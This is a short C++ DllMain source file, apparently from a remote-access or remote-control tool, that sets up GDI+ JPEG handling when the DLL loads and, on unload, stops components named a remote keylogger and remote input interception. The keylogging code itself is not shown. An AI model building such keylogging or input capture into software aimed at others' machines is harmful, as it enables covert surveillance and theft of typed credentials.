// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "gdiplus_jpeg.h"
#include "remote_input_interception.h"
#include "remote_keylogger.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        OutputDebugStringA("[remote] DllMain DLL_PROCESS_ATTACH\n");
        gdiplus_jpeg_init();
        OutputDebugStringA("[remote] DllMain GDI+ init done\n");
        break;
    case DLL_PROCESS_DETACH:
        remote_keylogger_stop();
        remote_input_interception_shutdown();
        gdiplus_jpeg_shutdown();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

